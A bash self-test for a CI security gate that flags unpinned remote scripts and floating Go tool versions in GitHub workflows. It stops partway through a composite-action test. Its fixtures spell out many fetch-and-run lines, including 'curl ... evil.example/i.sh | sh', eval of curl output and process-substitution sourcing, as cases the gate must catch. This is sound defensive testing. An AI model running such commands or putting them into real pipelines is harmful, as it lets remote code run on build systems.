#!/usr/bin/env bash
# provenance: candidate; ttl: 2027-04-01; pinning: true
# template-workflow-pins-selftest.sh — the gate must pass the pinned form and fail,
# naming file:line, on each unpinned-remote-script and floating-version shape; and
# the REAL template must pass, so this goes red if the template regresses.
set -uo pipefail
here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
GATE="$here/../template-workflow-pins.sh"
REAL="$here/../../prod-new/template/.github/workflows"
T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT
n=0; fail=0
SHA=b254e6d92f28c3868a755f62fb3ca8f26e9fee76
check() { n=$((n+1)); if [[ "$2" != 0 ]]; then echo "FAIL: $1" >&2; fail=$((fail+1)); fi; }

# fixture NAME LINE... -> dir with one workflow whose step run is LINE
fixture() { mkdir -p "$T/$1"; printf 'jobs:\n  j:\n    steps:\n      - name: x\n        run: %s\n' "$2" > "$T/$1/w.yaml"; }
expect_fail() { # name, run-line, expected line number
  fixture "$1" "$2"; local o rc; o="$(bash "$GATE" "$T/$1" 2>&1)"; rc=$?
  [[ $rc == 1 ]] && grep -qF "w.yaml:$3:" <<<"$o" && grep -qF -- "${4:-$2}" <<<"$o"; check "$1 fails rc=1 naming w.yaml:$3" $?
}

fixture pinned "curl -sSfL https://raw.githubusercontent.com/o/r/$SHA/install.sh | sh -s -- -b /usr/local/bin v1.0.0"
o="$(bash "$GATE" "$T/pinned" 2>&1)"; rc=$?
[[ $rc == 0 ]] && grep -qF "remote_steps=1" <<<"$o"; check "pinned commit passes and counts one remote step" $?

expect_fail main   "curl -sSfL https://raw.githubusercontent.com/o/r/main/install.sh | sh" 5
expect_fail master "bash <(curl -sSfL https://raw.githubusercontent.com/o/r/master/install.sh)" 5
expect_fail short  "curl -sSfL https://raw.githubusercontent.com/o/r/abc1234/i.sh | bash" 5
expect_fail other  "curl -sSfL https://example.invalid/i.sh | sh" 5
expect_fail subst  'sh -c "$(curl -fsSL https://github.com/o/r/raw/HEAD/i.sh)"' 5
expect_fail golatest "go install example.invalid/x@latest" 5
expect_fail gomain   "go install example.invalid/x@main" 5

# sumok was replaced (PS-A2 review): it asserted that a checksum in the step exempts a
# PIPE, which is wrong -- a stream never touches disk, so no checksum covers it.
# Its two successors state the new rule.
fixture sumpipe "curl -sSfL https://example.invalid/i.sh | sh; sha256sum -c i.sum"
o="$(bash "$GATE" "$T/sumpipe" 2>&1)"; rc=$?
[[ $rc == 1 ]] && grep -qF "w.yaml:5:" <<<"$o"; check "other host: pipe + checksum in the step is still a finding" $?
fixture sumfile "curl -sSfL -o i.sh https://example.invalid/i.sh && sha256sum -c i.sum"
bash "$GATE" "$T/sumfile" >/dev/null 2>&1; check "other host: file download + checksum in the step passes" $?

mkdir -p "$T/comment"; printf 'steps:\n  # run: curl https://raw.githubusercontent.com/o/r/main/i.sh | sh\n  - run: echo ok\n' > "$T/comment/w.yaml"
bash "$GATE" "$T/comment" >/dev/null 2>&1; check "commented-out offending line passes" $?

mkdir -p "$T/empty"; bash "$GATE" "$T/empty" >/dev/null 2>&1; rc=$?
[[ $rc == 2 ]]; check "empty directory exits 2" $?

bash "$GATE" "$REAL" >/dev/null 2>&1; check "the real template workflows pass" $?

# ======================= PS-A2: the rule judges the FETCH =======================
# provenance: candidate; ttl: 2027-04-01; pinning: true (every case pins one shape the review reproduced)
mk() { mkdir -p "$T/$1"; cat > "$T/$1/w.yaml"; }   # workflow text on stdin
bad() { # name, expected line, [needle]
  local o rc; o="$(bash "$GATE" "$T/$1" 2>&1)"; rc=$?
  [[ $rc == 1 ]] && grep -qF "w.yaml:$2:" <<<"$o" && { [[ -z "${3:-}" ]] || grep -qF -- "$3" <<<"$o"; }; check "$1: rc=1 names w.yaml:$2${3:+ ($3)}" $?
}
good() { bash "$GATE" "$T/$1" >/dev/null 2>&1; check "$1: passes rc=0" $?; }
M=https://raw.githubusercontent.com/o/r/main/i.sh
# one-step workflows: the run value on line 5
for spec in \
  "pipe_abs_sh|curl -sSfL $M | /bin/sh" \
  "pipe_sudo_E|curl -sSfL $M | sudo -E bash" \
  "pipe_sudo_u|curl -sSfL $M | sudo -u root sh" \
  "pipe_env|curl -sSfL $M | env sh" \
  "pipe_python|curl -sSfL $M | python3" \
  "pipe_zsh|curl -sSfL $M | zsh" \
  "pipe_dash|curl -sSfL $M | dash" \
  "pipe_any|curl -sSfL $M | tee /tmp/x" \
  "plain_redirect|curl -sSfL https://example.invalid/b > b" \
  "plain_long_output|curl -sSfL --output tool.tgz https://example.invalid/tool.tgz" \
  "abs_curl|/usr/bin/curl -sSfL -o i.sh $M" \
  "tab_go|go	install example.invalid/x@latest" \
  "ref_then_sha_raw|curl -sSfL -o i.sh https://github.com/o/r/raw/main/$SHA/i.sh" \
  "ref_then_sha_rawhost|curl -sSfL -o i.sh https://raw.githubusercontent.com/o/r/main/$SHA/i.sh" \
  "ref_then_sha_blob|curl -sSfL -o i.sh https://github.com/o/r/blob/main/$SHA/i.sh" \
  "ref_then_sha_gist|curl -sSfL -o i.sh https://gist.githubusercontent.com/o/abc/raw/main/$SHA/i.sh" \
  "ref_then_sha_codeload|curl -sSfL -o a.tgz https://codeload.github.com/o/r/tar.gz/main/$SHA" \
  "ref_then_sha_archive|curl -sSfL -o a.tgz https://github.com/o/r/archive/main/$SHA.tar.gz" \
  "dl_run_oneline|curl -sSfL -o i.sh $M && sh i.sh" \
  "dl_redirect|curl -sSfL $M > i.sh; sh i.sh" \
  "wget_file|wget -q $M && sh i.sh" \
  "wget_stdout|wget -qO- $M | sh" \
  "source_proc|source <(curl -sSfL $M)" \
  "dot_proc|. <(curl -sSfL $M)" \
  "blob_ref|curl -sSfL -o i.sh https://github.com/o/r/blob/main/i.sh" \
  "raw_ref|curl -sSfL -o i.sh https://github.com/o/r/raw/main/i.sh" \
  "refs_heads|curl -sSfL -o i.sh https://raw.githubusercontent.com/o/r/refs/heads/main/i.sh" \
  "archive_branch|curl -sSfL -o a.tgz https://github.com/o/r/archive/main.tar.gz" \
  "archive_refs|curl -sSfL -o a.tgz https://github.com/o/r/archive/refs/heads/main.tar.gz" \
  "archive_tag|curl -sSfL -o a.tgz https://github.com/o/r/archive/v1.0.0.tar.gz" \
  "codeload_branch|curl -sSfL -o a.tgz https://codeload.github.com/o/r/tar.gz/main" \
  "gist_noref|curl -sSfL https://gist.githubusercontent.com/o/abc/raw/i.sh" \
  "api_noref|curl -sSfL -o x.json https://api.github.com/repos/o/r/tarball/main" \
  "schemeless|curl -sSfL raw.githubusercontent.com/o/r/main/i.sh" \
  "latest_dl_sum|curl -sSfL -o b https://github.com/o/r/releases/latest/download/b && sha256sum -c b.sum" \
  "release_nosum|curl -sSfL -o b https://github.com/o/r/releases/download/v1.0.0/b" \
  "release_pipe_sum|curl -sSfL https://github.com/o/r/releases/download/v1.0.0/i.sh | sh; sha256sum -c i.sum" \
  "release_stdout|curl -sSfL https://github.com/o/r/releases/download/v1.0.0/b" \
  "plain_nosum|curl -sSfL -o tool.tgz https://example.invalid/tool.tgz" \
  "plain_wget_nosum|wget -q https://example.invalid/tool.tgz" \
  "gorun_latest|go run example.invalid/x@latest" \
  "goinst_head|go install example.invalid/x@HEAD" \
  "goinst_short|go install example.invalid/x@abc1234" \
  "goinst_branch|go install example.invalid/x@develop" \
  "goinst_upgrade|go install example.invalid/x@upgrade" \
  "goinst_comment|go install example.invalid/x@latest # newest" \
  "goinst_multi|go install example.invalid/a@v1.2.3 example.invalid/b@main" ; do
  fixture "${spec%%|*}" "${spec#*|}"
done
for c in pipe_abs_sh pipe_sudo_E pipe_sudo_u pipe_env pipe_python pipe_zsh pipe_dash pipe_any dl_run_oneline dl_redirect wget_file wget_stdout \
         source_proc dot_proc blob_ref raw_ref ref_then_sha_raw ref_then_sha_rawhost ref_then_sha_blob ref_then_sha_gist ref_then_sha_codeload ref_then_sha_archive refs_heads archive_branch archive_refs archive_tag codeload_branch gist_noref api_noref schemeless; do
  bad "$c" 5 "mutable GitHub ref"
done
bad latest_dl_sum 5 "always moves"
bad release_nosum 5 "no checksum verification of the downloaded file"
bad release_pipe_sum 5 "in-stream"
bad release_stdout 5 "no checksum verification of the downloaded file"
bad plain_nosum 5 "no checksum verification in the step"
bad plain_wget_nosum 5 "no checksum verification in the step"
bad plain_redirect 5 "no checksum verification in the step"
bad plain_long_output 5 "no checksum verification in the step"
bad abs_curl 5 "mutable GitHub ref"
bad tab_go 5 "floating tool version"
for c in gorun_latest goinst_head goinst_short goinst_branch goinst_upgrade goinst_comment; do bad "$c" 5 "floating tool version"; done
bad goinst_multi 5 "floating tool version"

# accepted shapes
for spec in \
  "ok_gosem|go install example.invalid/x@v1.2.3" \
  "ok_gopre|go install example.invalid/x@v1.2.3-rc.1+build.5" \
  "ok_gosha|go run example.invalid/x@$SHA" \
  "ok_gowrapped|bash scripts/retry.sh go install example.invalid/x@v2.12.2" \
  "ok_golocal|go install ./cmd/x" \
  "ok_releasefile|curl -sSfL -o b https://github.com/o/r/releases/download/v1.0.0/b && sha256sum -c b.sum" \
  "ok_sumcheckflag|wget -q https://example.invalid/b && sha256sum --check b.sum" \
  "ok_stdout_probe|curl -sSf https://example.invalid/healthz" \
  "ok_pinned_file|curl -sSfL -o i.sh https://github.com/o/r/raw/$SHA/i.sh" \
  "ok_pinned_blob|curl -sSfL https://github.com/o/r/blob/$SHA/i.sh | bash" \
  "ok_pinned_archive|curl -sSfL -o a.tgz https://github.com/o/r/archive/$SHA.tar.gz" \
  "ok_pinned_api|curl -sSfL https://api.github.com/repos/o/r/tarball/$SHA -o a.tgz" \
  "ok_gist_pinned|curl -sSfL -o i.sh https://gist.githubusercontent.com/o/abc/raw/$SHA/i.sh" \
  "ok_codeload_pinned|curl -sSfL -o a.tgz https://codeload.github.com/o/r/tar.gz/$SHA" \
  "ok_pinned_query|curl -sSfL -o a.tgz https://github.com/o/r/archive/$SHA.tar.gz?x=1" \
  "ok_wget_stdout|wget -qO- https://example.invalid/healthz" \
  "ok_andand|curl -sSf https://example.invalid/healthz && echo ok > out.txt" \
  "ok_semi|curl -sSf https://example.invalid/healthz; echo ok > out.txt" \
  "ok_oror|curl -sSf https://example.invalid/healthz || echo no > out.txt" \
  "ok_tab_sum|curl -sSfL -o b https://example.invalid/b && sha256sum	-c b.sum" \
  "ok_apt|sudo apt-get install -y curl" \
  "ok_devnull|curl -sSf https://example.invalid/healthz 2>&1 >/dev/null" ; do
  fixture "${spec%%|*}" "${spec#*|}"
done
for c in ok_gosem ok_gopre ok_gosha ok_gowrapped ok_golocal ok_releasefile ok_sumcheckflag ok_stdout_probe ok_pinned_file ok_pinned_blob ok_pinned_archive ok_pinned_api ok_gist_pinned ok_codeload_pinned ok_pinned_query ok_wget_stdout ok_andand ok_semi ok_oror ok_tab_sum ok_apt ok_devnull; do good "$c"; done


# shapes whose run value carries quotes/substitutions: raw text, no shell escaping
one() { mkdir -p "$T/$1"; { printf 'jobs:\n  j:\n    steps:\n      - name: x\n        run: '; cat; } > "$T/$1/w.yaml"; }
one eval_subst   <<'X'
eval "$(curl -sSfL https://raw.githubusercontent.com/o/r/main/i.sh)"
X
one backtick     <<'X'
eval `curl -sSfL https://raw.githubusercontent.com/o/r/main/i.sh`
X
one quoted_dq    <<'X'
"curl -sSfL https://raw.githubusercontent.com/o/r/main/i.sh | sh"
X
one quoted_sq    <<'X'
'curl -sSfL https://raw.githubusercontent.com/o/r/main/i.sh | sh'
X
one var_url      <<'X'
curl -sSfL "$URL" -o i.sh
X
one var_ref      <<'X'
curl -sSfL -o i.sh https://raw.githubusercontent.com/o/r/$REF/i.sh
X
one var_pipe_sum <<'X'
curl -sSfL "$URL" | sh; sha256sum -c i.sum
X
one goinst_quoted <<'X'
go install "example.invalid/x@latest"
X
one goinst_var   <<'X'
go install example.invalid/x@$V
X
one ok_shasumcheck <<'X'
curl -sSfL -o b https://example.invalid/b && echo "x  b" | shasum -a 256 -c -
X
one ok_varsum    <<'X'
curl -sSfL -o i.sh "$URL" && sha256sum -c i.sum
X
for c in eval_subst backtick quoted_dq quoted_sq; do bad "$c" 5 "mutable GitHub ref"; done
for c in var_url var_ref var_pipe_sum; do bad "$c" 5 "cannot verify what is fetched"; done
bad goinst_quoted 5 "floating tool version"
bad goinst_var 5 "cannot verify go tool version"
good ok_shasumcheck
good ok_varsum
one subst_other_dollar <<'X'
eval "$(curl -sSfL https://example.invalid/i.sh)"; sha256sum -c i.sum
X
one subst_other_proc   <<'X'
source <(curl -sSfL https://example.invalid/i.sh)
X
one subst_other_btick  <<'X'
eval `curl -sSfL https://example.invalid/i.sh`
X
one ok_goquoted <<'X'
go install "example.invalid/x@v1.2.3"
X
one ok_goflag <<'X'
go install -ldflags=-X=u@h example.invalid/x@v1.2.3
X
for c in subst_other_dollar subst_other_proc subst_other_btick; do bad "$c" 5 "consumed in-stream"; done
good ok_goquoted
good ok_goflag
one ok_inline_comment <<'X'
echo ok # curl -sSfL https://raw.githubusercontent.com/o/r/main/i.sh | sh
X
good ok_inline_comment
one ok_closed_subst <<'X'
echo "$(date)"; curl -sSf https://example.invalid/healthz
X
one sum_other_cmd <<'X'
sha256sum b > b.sum; curl -sSfL -c jar -o b https://example.invalid/b
X
good ok_closed_subst
bad sum_other_cmd 5 "no checksum verification in the step"

# multi-line shapes: curl and execution on different lines; folded; continuations
mk ml_literal <<EOF2
jobs:
  j:
    steps:
      - name: x
        run: |
          set -e
          curl -sSfL -o i.sh $M
          sh i.sh
EOF2
bad ml_literal 7 "mutable GitHub ref"
mk ml_folded <<EOF2
jobs:
  j:
    steps:
      - name: x
        run: >
          curl -sSfL
          $M
          | sh
EOF2
bad ml_folded 5 "mutable GitHub ref"
mk ml_continuation <<EOF2
jobs:
  j:
    steps:
      - run: |
          curl -sSfL \\
            -o i.sh \\
            $M
          sh i.sh
EOF2
bad ml_continuation 5 "mutable GitHub ref"
mk ml_checksum_other_line <<EOF2
jobs:
  j:
    steps:
      - run: |
          curl -sSfL -o b https://example.invalid/b
          sha256sum -c b.sum
EOF2
good ml_checksum_other_line
mk ml_checksum_other_step <<EOF2
jobs:
  j:
    steps:
      - run: curl -sSfL -o b https://example.invalid/b
      - run: sha256sum -c b.sum
EOF2
bad ml_checksum_other_step 4 "no checksum verification in the step"
mk ml_two_steps <<EOF2
jobs:
  j:
    steps:
      - run: echo fine
      - run: |
          echo hi
          curl -sSfL $M | sh
EOF2
bad ml_two_steps 7 "mutable GitHub ref"
mk ml_crlf_tabs <<EOF2
jobs:
  j:
    steps:
      - name: x
        run: curl -sSfL	$M	| sh
EOF2
sed -i.bak 's/$/\r/' "$T/ml_crlf_tabs/w.yaml"; rm -f "$T/ml_crlf_tabs/w.yaml.bak"
bad ml_crlf_tabs 5 "mutable GitHub ref"
mk ml_pinned_block <<EOF2
jobs:
  j:
    steps:
      - run: |
          curl -sSfL https://raw.githubusercontent.com/o/r/$SHA/i.sh | sh
EOF2
good ml_pinned_block
mk ml_name_if <<EOF2
jobs:
  j:
    steps:
      - name: "curl $M | sh is not run here"
        if: "\${{ false }} # curl $M | sh"
        run: echo ok
EOF2
good ml_name_if
mk ml_comment_in_block <<EOF2
jobs:
  j:
    steps:
      - run: |
          # curl $M | sh
          echo ok # curl $M | sh
EOF2
good ml_comment_in_block
mk ml_dash_in_block <<EOF2
jobs:
  j:
    steps:
      - run: |
          cat <<X
          - curl is mentioned
          X
          echo ok
EOF2
good ml_dash_in_block

# CRLF files: pinned forms must still pass (a stray CR must not turn a semver into a finding)
fixture crlf_gosem "go install example.invalid/x@v1.2.3"
mk crlf_block <<EOF2
jobs:
  j:
    steps:
      - run: |
          curl -sSfL https://raw.githubusercontent.com/o/r/$SHA/i.sh | sh
          go install example.invalid/x@v1.2.3
EOF2
for d in crlf_gosem crlf_block; do sed -i.bak 's/$/\r/' "$T/$d/w.yaml"; rm -f "$T/$d/w.yaml.bak"; done
good crlf_gosem
good crlf_block

# a step must not leak across files: a checksum at the top of the NEXT file does not cover this file's fetch
mkdir -p "$T/xfile"
printf 'jobs:\n  j:\n    steps:\n      - name: x\n        run: curl -sSfL -o b https://example.invalid/b\n' > "$T/xfile/a.yaml"
printf 'run: sha256sum -c b.sum\n' > "$T/xfile/b.yaml"
xfile_case() {
  local xo xrc ok=0
  if xo="$(bash "$GATE" "$T/xfile" 2>&1)"; then xrc=0; else xrc=$?; fi
  { [[ $xrc == 1 ]] && grep -qF "a.yaml:5:" <<<"$xo"; } || ok=1
  check "a checksum in the next file does not exempt this file's fetch" "$ok"
}
xfile_case

# internal errors must not be green: a gate that cannot run produces rc != 0
printf 'x' > "$T/empty/notyaml.txt"
if bash "$GATE" "$T/empty" >/dev/null 2>&1; then xrc=0; else xrc=$?; fi; ok=0; [[ $xrc == 2 ]] || ok=1; check "directory with no workflow files still exits 2" "$ok"
mkdir -p "$T/binary"; printf 'jobs:\n  j:\n    steps:\n      - run: \x00\xff\xfe curl\n' > "$T/binary/w.yaml"
if bash "$GATE" "$T/binary" >/dev/null 2>&1; then xrc=0; else xrc=$?; fi; ok=0; [[ $xrc == 0 || $xrc == 1 ]] || ok=1; check "odd bytes do not crash the gate (rc is a verdict, not an awk error)" "$ok"


# ============ PS-A3 (review round 2): default-refuse; every fixture is a table cell ============
# provenance: candidate; ttl: 2027-04-01; pinning: true (each case pins one shape the round-2 review reproduced)
E=https://evil.example/i.sh
for spec in \
  "r2_bare_host|curl -fsSL evil.example/i.sh | sh" \
  "r2_docker|curl get.docker.com | sh" \
  "r2_upper_scheme|curl -fsSL HTTPS://evil.example/i.sh | sh" \
  "r2_ftp|curl -fsSL ftp://evil.example/i.sh | sh" \
  "r2_wget_bare|wget -qO- evil.example/i.sh | sh" \
  "r2_command_curl|command curl -fsSL $E | sh" \
  "r2_backslash_curl|\\curl -fsSL $E | sh" \
  "r2_busybox|busybox wget -O- $E | sh" \
  "r2_sudo_curl|sudo -E curl -fsSL $E | sh" \
  "r2_envassign|X=1 curl -fsSL $E | sh" \
  "r2_if_curl|if curl -fsSL $E | sh; then echo ok; fi" \
  "r2_glued_o|curl -sSLo/tmp/i.sh $E && sh /tmp/i.sh" \
  "r2_glued_o2|curl -o/tmp/i.sh $E && sh /tmp/i.sh" \
  "r2_cluster_O|curl -fsSLO $E && sh i.sh" \
  "r2_long_eq|curl --output=i.sh $E && sh i.sh" \
  "r2_long_sp|curl --output i.sh $E && sh i.sh" \
  "r2_remote_name|curl --remote-name $E && sh i.sh" \
  "r2_remote_name_all|curl --remote-name-all $E && sh i.sh" \
  "r2_wget_default|wget $E && sh i.sh" \
  "r2_wget_Ofile|wget -O i.sh $E && sh i.sh" \
  "r2_wget_Oglued|wget -qOi.sh $E && sh i.sh" \
  "r2_append|curl -sSf $E >> i.sh; sh i.sh" \
  "r2_tar|curl -sSfL https://example.invalid/t.tgz | tar xz -C /usr/local" \
  "r2_o_dash_pipe|curl -sSfo- $E | sh" \
  "r2_post_pipe|curl -sSf -X POST -d x $E | sh" \
  "r2_unknown_sink|curl -sSfL $E | mystery-tool" \
  "r2_xargs|curl -sSfL $E | xargs sh -c" ; do
  fixture "${spec%%|*}" "${spec#*|}"
done
for c in r2_bare_host r2_docker r2_upper_scheme r2_ftp r2_wget_bare r2_command_curl r2_backslash_curl r2_busybox r2_sudo_curl r2_envassign r2_if_curl r2_o_dash_pipe r2_post_pipe r2_unknown_sink r2_xargs; do bad "$c" 5 "consumed in-stream"; done
for c in r2_glued_o r2_glued_o2 r2_cluster_O r2_long_eq r2_long_sp r2_remote_name r2_remote_name_all r2_wget_default r2_wget_Ofile r2_wget_Oglued r2_append; do bad "$c" 5 "no checksum verification in the step"; done
bad r2_tar 5 "no checksum verification in the step"
# a file target through the tar/tee sink class is "file": no checksum -> finding text is the file one
fixture r2_tee "curl -sSfL $E | tee /tmp/x"; bad r2_tee 5 "no checksum verification in the step"
fixture r2_tar_file "curl -sSfL https://example.invalid/t.tgz | tar xz"; bad r2_tar_file 5 "no checksum verification in the step"
# the same glued/odd spellings against a GitHub ref and a bare host, and a host in other case
for spec in \
  "r2_gh_upper_host|curl -fsSL RAW.githubusercontent.com/o/r/main/i.sh | sh" \
  "r2_gh_upper_scheme|curl -fsSL HTTPS://Raw.GitHubUserContent.com/o/r/main/i.sh | sh" \
  "r2_gh_glued|curl -sSLo/tmp/i.sh https://raw.githubusercontent.com/o/r/main/i.sh" \
  "r2_api_ref_qs|curl -fsSL https://api.github.com/repos/o/r/contents/i.sh?ref=main\\&x=$SHA | sh" \
  "r2_api_sha_owner|curl -fsSL https://api.github.com/repos/o/$SHA/tarball/main -o a.tgz" \
  "r2_api_repo_sha|curl -fsSL https://api.github.com/repos/$SHA/r/tarball/main -o a.tgz" \
  "r2_api_contents_noref|curl -fsSL https://api.github.com/repos/o/r/contents/i.sh -o i.sh" \
  "r2_api_commits_branch|curl -fsSL https://api.github.com/repos/o/r/commits/main -o c.json" \
  "r2_api_trees_branch|curl -fsSL https://api.github.com/repos/o/r/git/trees/main -o c.json" \
  "r2_api_tarball_noref|curl -fsSL https://api.github.com/repos/o/r/tarball -o a.tgz" ; do
  fixture "${spec%%|*}" "${spec#*|}"
done
for c in r2_gh_upper_host r2_gh_upper_scheme r2_gh_glued r2_api_ref_qs r2_api_sha_owner r2_api_repo_sha r2_api_contents_noref r2_api_commits_branch r2_api_trees_branch r2_api_tarball_noref; do bad "$c" 5 "mutable GitHub ref"; done
for spec in \
  "r2_shape_filesha|curl -fsSL -o i.sh https://github.com/o/r/x/main/$SHA/i.sh" \
  "r2_shape_owner_sha|curl -fsSL -o i.sh https://github.com/$SHA/r/x/main/i.sh" \
  "r2_shape_other_host|curl -fsSL -o i.sh https://objects.githubusercontent.com/o/r/$SHA/i.sh" \
  "r2_shape_pulls_file|curl -fsSL https://api.github.com/repos/o/r/pulls/1 -o p.json" \
  "r2_shape_pulls_sh|curl -fsSL https://api.github.com/repos/o/r/pulls/1 | sh" \
  "r2_shape_releases_tag|curl -fsSL -o i.sh https://github.com/o/r/releases/tag/v1" ; do
  fixture "${spec%%|*}" "${spec#*|}"
done
for c in r2_shape_filesha r2_shape_owner_sha r2_shape_other_host r2_shape_pulls_file r2_shape_pulls_sh r2_shape_releases_tag; do bad "$c" 5 "unrecognised GitHub URL shape"; done
fixture r2_nourl_pipe "curl -fsSL -K cfg | sh"; bad r2_nourl_pipe 5 "cannot verify what is fetched"
fixture r2_nourl_file "curl -fsSL -K cfg -o x"; bad r2_nourl_file 5 "cannot verify what is fetched"
# sha in ITS position stays ok, in every shape, and with a 40-hex owner too
for spec in \
  "r2_ok_contents_ref|curl -fsSL https://api.github.com/repos/o/r/contents/i.sh?ref=$SHA | sh" \
  "r2_ok_commits|curl -fsSL https://api.github.com/repos/o/r/commits/$SHA -o c.json" \
  "r2_ok_trees|curl -fsSL https://api.github.com/repos/o/r/git/trees/$SHA -o t.json" \
  "r2_ok_zipball|curl -fsSL https://api.github.com/repos/$SHA/r/zipball/$SHA -o z.zip" \
  "r2_ok_upper_sha|curl -fsSL RAW.githubusercontent.com/o/r/$SHA/i.sh | sh" \
  "r2_ok_gh_tarball|curl -fsSL https://github.com/o/r/tarball/$SHA -o t.tgz" \
  "r2_ok_o_dash|curl -sSfo- https://example.invalid/healthz" \
  "r2_ok_o_dash2|curl -sSf -o - https://example.invalid/healthz | jq ." \
  "r2_ok_wget_stdout2|wget -q -O - https://example.invalid/healthz" \
  "r2_ok_wget_longout|wget --output-document=- https://example.invalid/healthz" \
  "r2_ok_sum_glued|curl -sSLo/tmp/b https://example.invalid/b && sha256sum -c b.sum" \
  "r2_ok_apt_curl|apt-get install -y curl wget" \
  "r2_ok_command_v|if ! command -v curl >/dev/null; then echo no; fi" \
  "r2_ok_which|which curl" \
  "r2_ok_echo|echo curl is needed" \
  "r2_ok_version|curl --version | head -n 1" \
  "r2_ok_discard_w|curl -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/ready" \
  "r2_ok_discard_redir|curl -sf https://example.invalid/ready > /dev/null" \
  "r2_ok_discard_redir2|curl -s -f http://127.0.0.1:8080/ready >/dev/null 2>&1" \
  "r2_ok_head|curl --head https://example.invalid/x.tgz" \
  "r2_ok_head_I|curl -sSfI https://example.invalid/x.tgz" \
  "r2_ok_discard_gh|curl -sSf -o /dev/null https://raw.githubusercontent.com/o/r/main/i.sh" \
  "r2_ok_post|curl -sSf -X POST -d '{\"a\":1}' \"\$SOME_URL\"" \
  "r2_ok_post_data|curl -sSf --data-binary @payload.json https://example.invalid/hook" \
  "r2_ok_post_form|curl -sSf -F f=@x.log \$HOOK_URL" \
  "r2_ok_upload|curl -sSf -T report.txt https://example.invalid/up" \
  "r2_ok_api_print|curl -sSf https://api.github.com/repos/o/r/pulls/1" \
  "r2_ok_api_jq|curl -sSf https://api.github.com/repos/o/r/pulls/1 | jq -r .title" \
  "r2_ok_api_grep_head|curl -sSf https://api.github.com/repos/o/r/pulls/1 | grep state | head -n 1" \
  "r2_ok_api_assign|V=\$(curl -sSf https://api.github.com/repos/o/r/releases/latest | jq -r .tag_name)" \
  "r2_ok_var_print|curl -sSf \"\$URL\"" \
  "r2_ok_wget_spider|wget -q --spider https://example.invalid/x" ; do
  fixture "${spec%%|*}" "${spec#*|}"
done
for c in r2_ok_contents_ref r2_ok_commits r2_ok_trees r2_ok_zipball r2_ok_upper_sha r2_ok_gh_tarball r2_ok_o_dash r2_ok_o_dash2 r2_ok_wget_stdout2 r2_ok_wget_longout r2_ok_sum_glued \
         r2_ok_apt_curl r2_ok_command_v r2_ok_which r2_ok_echo r2_ok_version r2_ok_discard_w r2_ok_discard_redir r2_ok_discard_redir2 r2_ok_head r2_ok_head_I r2_ok_discard_gh \
         r2_ok_post r2_ok_post_data r2_ok_post_form r2_ok_upload r2_ok_api_print r2_ok_api_jq r2_ok_api_grep_head r2_ok_api_assign r2_ok_var_print r2_ok_wget_spider; do good "$c"; done
# the reviewer's wording, run through the gate verbatim: the webhook POST piped into a shell / saved stays a finding
fixture r2_post_saved "curl -sSf -X POST -d x \"\$SOME_URL\" -o r.sh && sh r.sh"; bad r2_post_saved 5 "cannot verify what is fetched"
fixture r2_post_piped "curl -sSf -d x \"\$SOME_URL\" | sh"; bad r2_post_piped 5 "cannot verify what is fetched"
fixture r2_api_eval "eval \"\$(curl -sSf https://api.github.com/repos/o/r/pulls/1)\""; bad r2_api_eval 5 "unrecognised GitHub URL shape"
fixture r2_api_assign_sh "V=\$(curl -sSf https://api.github.com/repos/o/r/pulls/1 | sh)"; bad r2_api_assign_sh 5 "unrecognised GitHub URL shape"
fixture r2_gh_content_print "curl -sSf https://raw.githubusercontent.com/o/r/main/i.sh | jq ."; bad r2_gh_content_print 5 "mutable GitHub ref"

# negative space of the command-position rule: only a MENTION may be skipped, and each skip needs a case where the mention is not harmless
fixture r2_ok_command_v_file "command -v curl > tools.txt"; good r2_ok_command_v_file
fixture r2_ok_which_file "which curl wget > tools.txt"; good r2_ok_which_file
fixture r2_ok_echo_file "echo curl > list.txt"; good r2_ok_echo_file
fixture r2_ok_apt_file "sudo apt-get install -y curl wget > apt.log"; good r2_ok_apt_file
fixture r2_ok_image_name "docker run --rm curlimages/curl -sf https://example.invalid/x > out.txt"; good r2_ok_image_name
mk r2_ok_heredoc_dash <<EOF2
jobs:
  j:
    steps:
      - run: |
          cat <<X
          - curl -fsSL evil.example/i.sh | sh
          X
EOF2
good r2_ok_heredoc_dash
fixture r2_bad_wrapped_nocmd "timeout 30 curl -fsSL $E | sh"; bad r2_bad_wrapped_nocmd 5 "consumed in-stream"
fixture r2_bad_sh_c "sh -c \"curl -fsSL $E | sh\""; bad r2_bad_sh_c 5 "consumed in-stream"
fixture r2_bad_abs_path "/usr/bin/curl -fsSL $E | sh"; bad r2_bad_abs_path 5 "consumed in-stream"
fixture r2_bad_rel_path "./curl -fsSL $E | sh"; bad r2_bad_rel_path 5 "consumed in-stream"
fixture r2_bad_stderr_then_file "curl -sSf $E 2>/dev/null > i.sh; sh i.sh"; bad r2_bad_stderr_then_file 5 "no checksum verification in the step"
fixture r2_bad_stage_after_grep "curl -sSf $E | grep x 2>&1 | sh"; bad r2_bad_stage_after_grep 5 "consumed in-stream"
fixture r2_bad_jq_to_file "curl -sSf $E | jq . > out.json"; bad r2_bad_jq_to_file 5 "no checksum verification in the step"
fixture r2_bad_expr_url "curl -sSfL \${{ secrets.U }} | sh"; bad r2_bad_expr_url 5 "cannot verify what is fetched"
fixture r2_bad_ref_two_values "curl -sSfL https://api.github.com/repos/o/r/contents/i.sh?ref=$SHA\\&ref=main -o i.sh"; bad r2_bad_ref_two_values 5 "mutable GitHub ref"
fixture r2_bad_subst_inert "eval \"\$(curl -sSf $E | head -n 5)\""; bad r2_bad_subst_inert 5 "consumed in-stream"
fixture r2_bad_wget_stdout_glued "wget -qO- evil.example/i.sh > i.sh; sh i.sh"; bad r2_bad_wget_stdout_glued 5 "no checksum verification in the step"

# scope decisions: composite actions are read; a shell the gate cannot read is a finding
mkdir -p "$T/act_bad/workflows" "$T/act_bad/actions/setup" "$T/act_ok/workflows" "$T/act_ok/actions/setup"
printf 'jobs:\n  j:\n    steps:\n      - run: echo fine\n' | tee "$T/act_bad/workflows/w.yaml" > "$T/act_ok/workflows/w.yaml"
printf 'runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: curl -sSfL %s | sh\n' "$M" > "$T/act_bad/actions/setup/action.yml"
printf 'runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: curl -sSfL https://raw.githubusercontent.com/o/r/%s/i.sh | sh\n' "$SHA" > "$T/act_ok/actions/setup/action.yml"
composite_action_case() {
  local o rc; o="$(bash "$GATE" "$T/act_bad/workflows" 2>&1)"; rc=$?
